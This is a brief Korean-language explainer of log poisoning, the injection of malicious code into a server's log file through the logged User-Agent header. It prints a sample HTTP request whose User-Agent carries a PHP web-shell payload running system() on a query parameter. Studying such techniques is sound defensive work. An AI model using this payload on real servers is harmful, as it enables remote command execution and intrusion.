# 개념
서버의 로그 파일에 악의적인 코드를 삽입하여 공격하는 기법

일반적으로 웹 애플리케이션은 사용자 에이전트(User-Agent) 정보를 로그 파일에 기록

	GET / HTTP/1.1
	User-Agent: aa<?php echo system($_GET['cmd']); ?>bb


